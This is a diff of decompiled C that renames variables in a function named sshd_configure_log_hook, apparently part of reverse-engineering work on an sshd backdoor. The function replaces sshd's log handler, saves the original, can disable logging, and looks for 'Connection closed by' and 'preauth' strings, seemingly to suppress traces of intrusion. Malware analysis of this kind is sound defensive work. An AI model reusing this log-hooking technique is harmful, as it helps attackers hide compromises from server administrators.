@@ -18,55 +18,52 @@
 BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags,global_context_t *ctx)
 
 {
-  byte bVar1;
-  sshd_log_ctx_t *psVar2;
-  ulong *puVar3;
-  void *pvVar4;
-  ulong *puVar5;
-  ulong *puVar6;
-  byte bVar7;
-  ulong *ctx_slot;
-  ulong *handler_slot;
+  byte flags1;
   sshd_log_ctx_t *log_ctx;
+  ulong *ctx_slot;
+  void *orig_ctx;
+  ulong *selected_ctx_slot;
+  ulong *handler_slot;
+  byte logging_requested;
   
-  psVar2 = ctx->sshd_log_ctx;
-  if (((((cmd_flags == (cmd_arguments_t *)0x0) || (psVar2 == (sshd_log_ctx_t *)0x0)) ||
-       (puVar6 = (ulong *)psVar2->log_handler_ptr, puVar6 == (ulong *)0x0)) ||
-      ((puVar3 = (ulong *)psVar2->log_handler_ctx_ptr, puVar3 == (ulong *)0x0 ||
-       (psVar2->mm_log_handler == (mm_log_handler_fn)0x0)))) ||
-     (psVar2->log_hooking_possible == FALSE)) {
+  log_ctx = ctx->sshd_log_ctx;
+  if (((((cmd_flags == (cmd_arguments_t *)0x0) || (log_ctx == (sshd_log_ctx_t *)0x0)) ||
+       (handler_slot = (ulong *)log_ctx->log_handler_ptr, handler_slot == (ulong *)0x0)) ||
+      ((ctx_slot = (ulong *)log_ctx->log_handler_ctx_ptr, ctx_slot == (ulong *)0x0 ||
+       (log_ctx->mm_log_handler == (mm_log_handler_fn)0x0)))) ||
+     (log_ctx->log_hooking_possible == FALSE)) {
     return FALSE;
   }
-  bVar1 = cmd_flags->flags1;
-  bVar7 = bVar1 & 8;
-  if ((bVar7 == 0) || (ctx->uid == 0)) {
-    pvVar4 = (void *)*puVar3;
-    puVar5 = puVar3;
-    if ((pvVar4 != (void *)0x0) &&
-       ((ctx->sshd_code_start <= pvVar4 && (pvVar4 < ctx->sshd_code_end)))) {
-      psVar2->log_handler_ptr = puVar3;
-      psVar2->log_handler_ctx_ptr = puVar6;
-      puVar5 = puVar6;
-      puVar6 = puVar3;
+  flags1 = cmd_flags->flags1;
+  logging_requested = flags1 & 8;
+  if ((logging_requested == 0) || (ctx->uid == 0)) {
+    orig_ctx = (void *)*ctx_slot;
+    selected_ctx_slot = ctx_slot;
+    if ((orig_ctx != (void *)0x0) &&
+       ((ctx->sshd_code_start <= orig_ctx && (orig_ctx < ctx->sshd_code_end)))) {
+      log_ctx->log_handler_ptr = ctx_slot;
+      log_ctx->log_handler_ctx_ptr = handler_slot;
+      selected_ctx_slot = handler_slot;
+      handler_slot = ctx_slot;
     }
-    pvVar4 = (void *)*puVar5;
-    psVar2->orig_log_handler = (log_handler_fn)*puVar6;
-    psVar2->orig_log_handler_ctx = pvVar4;
-    if (bVar7 == 0) {
-      psVar2->logging_disabled = TRUE;
+    orig_ctx = (void *)*selected_ctx_slot;
+    log_ctx->orig_log_handler = (log_handler_fn)*handler_slot;
+    log_ctx->orig_log_handler_ctx = orig_ctx;
+    if (logging_requested == 0) {
+      log_ctx->logging_disabled = TRUE;
     }
-    else if ((bVar1 & 0x10) != 0) {
-      if (psVar2->STR_percent_s == (char *)0x0) {
+    else if ((flags1 & 0x10) != 0) {
+      if (log_ctx->STR_percent_s == (char *)0x0) {
         return FALSE;
       }
-      if (psVar2->STR_Connection_closed_by == (char *)0x0) {
+      if (log_ctx->STR_Connection_closed_by == (char *)0x0) {
         return FALSE;
       }
-      if (psVar2->STR_preauth == (char *)0x0) {
+      if (log_ctx->STR_preauth == (char *)0x0) {
         return FALSE;
       }
     }
-    *puVar6 = (ulong)psVar2->mm_log_handler;
+    *handler_slot = (ulong)log_ctx->mm_log_handler;
   }
   return TRUE;
 }
